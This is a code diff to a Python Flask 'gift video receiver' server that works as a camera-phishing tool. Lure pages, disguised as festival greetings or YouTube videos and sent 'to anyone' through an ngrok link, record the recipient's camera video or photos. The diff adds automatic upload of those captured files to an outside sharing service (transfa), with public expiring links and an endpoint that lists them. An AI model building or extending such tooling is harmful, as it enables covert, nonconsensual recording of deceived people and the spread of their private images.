@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - Complete Terminal Menu (No Auto-Open)
+Gift Video Receiver Server - With transfa Cloud Upload
 """
 
 import os
@@ -18,13 +18,28 @@ from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 
 # ============================================
+# Import transfa
+# ============================================
+try:
+    import transfa
+    TRANSFA_AVAILABLE = True
+    print("✅ transfa library loaded successfully")
+except ImportError:
+    TRANSFA_AVAILABLE = False
+    print("⚠️ transfa library not installed. Run: pip install transfa")
+
+# ============================================
 # Configuration
 # ============================================
 UPLOAD_FOLDER = 'gift_videos'
 PORT = 5000
 FESTIVAL_HTML = 'festival.html'
 YOUTUBE_HTML = 'youtube.html'
-AUTO_OPEN = False  # Set to False to disable auto-opening
+
+# transfa configuration
+TRANSFA_TTL = "24h"  # Options: 1h, 24h, 7d, 30d
+TRANSFA_MAX_DOWNLOADS = None  # Set to number or None for unlimited
+TRANSFA_USE_GUEST = True  # True for guest mode (10MB limit, 24h TTL)
 
 # ============================================
 # Flask Application
@@ -33,6 +48,7 @@ app = Flask(__name__)
 CORS(app)
 
 received_files = []
+transfa_links = []
 
 @app.route('/festival')
 def festival_page():
@@ -71,6 +87,7 @@ def upload_media():
         filename = f"{media_type}_{timestamp}.{ext}"
         filepath = os.path.join(UPLOAD_FOLDER, filename)
 
+        # Save file locally first
         media_file.save(filepath)
         
         file_info = {
@@ -78,26 +95,69 @@ def upload_media():
             'path': filepath,
             'type': media_type,
             'timestamp': timestamp,
-            'size': os.path.getsize(filepath)
+            'size': os.path.getsize(filepath),
+            'transfa_link': None,
+            'transfa_delete_token': None
         }
+        
+        # ============================================
+        # Upload to transfa
+        # ============================================
+        if TRANSFA_AVAILABLE:
+            try:
+                print(f"\n☁️ Uploading {filename} to transfa...")
+                
+                # Prepare upload options
+                upload_options = {
+                    'ttl': TRANSFA_TTL
+                }
+                
+                if TRANSFA_MAX_DOWNLOADS:
+                    upload_options['max_downloads'] = TRANSFA_MAX_DOWNLOADS
+                
+                # Upload to transfa
+                result = transfa.upload(filepath, **upload_options)
+                
+                if result and hasattr(result, 'url'):
+                    file_info['transfa_link'] = result.url
+                    file_info['transfa_delete_token'] = getattr(result, 'delete_token', None)
+                    
+                    print(f"   ✅ Uploaded to transfa!")
+                    print(f"   🔗 Link: {result.url}")
+                    if hasattr(result, 'delete_token'):
+                        print(f"   🗑️ Delete token: {result.delete_token}")
+                    
+                    transfa_links.append({
+                        'filename': filename,
+                        'url': result.url,
+                        'delete_token': getattr(result, 'delete_token', None),
+                        'expires': TRANSFA_TTL
+                    })
+                else:
+                    print(f"   ⚠️ Upload failed - result: {result}")
+                    
+            except Exception as e:
+                print(f"   ❌ transfa upload error: {e}")
+        else:
+            print(f"   ⚠️ transfa not available. File saved locally only.")
+        
         received_files.append(file_info)
         
+        # Display received info
         print(f"\n📹 Received {media_type} {len(received_files)}")
         print(f"   📁 {filename}")
         print(f"   📊 {file_info['size']:,} bytes")
         print(f"   📂 Full path: {os.path.abspath(filepath)}")
         
-        # Auto-open is DISABLED
-        if AUTO_OPEN:
-            try:
-                if sys.platform == 'linux':
-                    subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                elif sys.platform == 'darwin':
-                    subprocess.run(['open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            except:
-                pass
+        if file_info.get('transfa_link'):
+            print(f"   ☁️ transfa link: {file_info['transfa_link']}")
         
-        return jsonify({'success': True, 'filename': filename}), 200
+        return jsonify({
+            'success': True, 
+            'filename': filename,
+            'transfa_link': file_info.get('transfa_link'),
+            'local_path': os.path.abspath(filepath)
+        }), 200
 
     except Exception as e:
         print(f"❌ Error: {e}")
@@ -105,7 +165,18 @@ def upload_media():
 
 @app.route('/files', methods=['GET'])
 def list_files():
-    return jsonify({'files': received_files})
+    return jsonify({
+        'files': received_files,
+        'transfa_links': transfa_links
+    })
+
+@app.route('/transfa-links', methods=['GET'])
+def get_transfa_links():
+    """Get all transfa links"""
+    return jsonify({
+        'links': transfa_links,
+        'total': len(transfa_links)
+    })
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_file(filename):
@@ -134,6 +205,15 @@ class GiftServer:
             return False
         if not os.path.exists(YOUTUBE_HTML):
             print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
+            return False
+        return True
+
+    def check_transfa(self):
+        """Check if transfa is installed"""
+        if not TRANSFA_AVAILABLE:
+            print("\n⚠️ transfa library not installed!")
+            print("📥 Install with: pip install transfa")
+            print("   Or: pip3 install transfa")
             return False
         return True
 
@@ -214,6 +294,30 @@ class GiftServer:
             print(f"   Using video ID: {video}")
         
         return video
+
+    def get_transfa_config(self):
+        """Get transfa configuration from user"""
+        print("\n☁️ transfa Cloud Upload Configuration:")
+        print("   Files will be uploaded to transfa with auto-expiry")
+        print("")
+        print("   Select expiry time:")
+        print("     1. 1 hour")
+        print("     2. 24 hours (default)")
+        print("     3. 7 days")
+        print("     4. 30 days")
+        
+        while True:
+            choice = input("\n   Enter choice (1-4, press Enter for default): ").strip()
+            if choice == '' or choice == '2':
+                return "24h"
+            elif choice == '1':
+                return "1h"
+            elif choice == '3':
+                return "7d"
+            elif choice == '4':
+                return "30d"
+            else:
+                print("   ❌ Invalid choice. Enter 1-4 or press Enter for default")
 
     def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
         base_url = self.ngrok_url
@@ -296,10 +400,11 @@ class GiftServer:
 
     def wait_for_files(self):
         print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
-        print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
+        print(f"📁 Files saved locally in: {UPLOAD_FOLDER}/")
+        print("☁️ Files will be uploaded to transfa cloud")
         print("-"*50)
         print("\n⏳ Waiting for first file...")
-        print("💡 Files will NOT auto-open. Check the folder manually.")
+        print("💡 Files will NOT auto-open. Check the folder or transfa links.")
         
         try:
             last_count = 0
@@ -312,8 +417,15 @@ class GiftServer:
                     print(f"   📁 {file_info['filename']}")
                     print(f"   📊 {file_info['size']:,} bytes")
                     print(f"   📂 Full path: {os.path.abspath(file_info['path'])}")
-                    print("\n   💡 To view the file, open it manually from the folder")
-                    print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
+                    
+                    if file_info.get('transfa_link'):
+                        print(f"   ☁️ transfa link: {file_info['transfa_link']}")
+                        print(f"   ⏰ Expires in: {TRANSFA_TTL}")
+                    else:
+                        print(f"   ⚠️ Not uploaded to transfa (check error above)")
+                    
+                    print("\n   💡 To download from transfa, use the link above")
+                    print(f"   📁 Or open locally: cd {os.path.abspath(UPLOAD_FOLDER)}")
                     last_count = current_count
                     print(f"\n⏳ Waiting for next file...")
                 
@@ -341,6 +453,16 @@ class GiftServer:
             
             if not self.check_ngrok():
                 return
+            
+            # Check transfa
+            if not self.check_transfa():
+                print("\n⚠️ Continuing without transfa (files saved locally only)")
+            
+            # Get transfa config
+            if TRANSFA_AVAILABLE:
+                global TRANSFA_TTL
+                TRANSFA_TTL = self.get_transfa_config()
+                print(f"   ✅ Files will expire after: {TRANSFA_TTL}")
             
             mode = self.show_main_menu()
             
@@ -371,6 +493,8 @@ class GiftServer:
             print(f"   🎯 Mode: {mode_name}")
             print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
             print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
+            if TRANSFA_AVAILABLE:
+                print(f"   ☁️ transfa expiry: {TRANSFA_TTL}")
             
             if mode == 'festival':
                 print(f"   🎊 Festival Name: {name}")
@@ -387,7 +511,7 @@ class GiftServer:
                     print(f"   5. Records {duration} second video")
                 else:
                     print(f"   5. Captures {photos} photos")
-                print("   6. Files save to your computer!")
+                print("   6. Files upload to transfa cloud!")
             else:
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
@@ -396,11 +520,14 @@ class GiftServer:
                     print(f"   4. Records {duration} second video")
                 else:
                     print(f"   4. Captures {photos} photos")
-                print("   5. Files save to your computer!")
+                print("   5. Files upload to transfa cloud!")
             
-            print("\n💡 Files will NOT auto-open. Check the folder manually:")
+            if TRANSFA_AVAILABLE:
+                print(f"\n☁️ transfa: Files expire after {TRANSFA_TTL}")
+                print("   Links will be shown when files are received")
+            
+            print("\n💡 Files saved locally too. Check the folder:")
             print(f"   📁 cd {os.path.abspath(UPLOAD_FOLDER)}")
-            print("   📂 ls -la")
             print("="*60)
             print("\n📋 Link printed above - copy it manually")
             print(f"📁 Files saved in: {os.path.abspath(UPLOAD_FOLDER)}/")
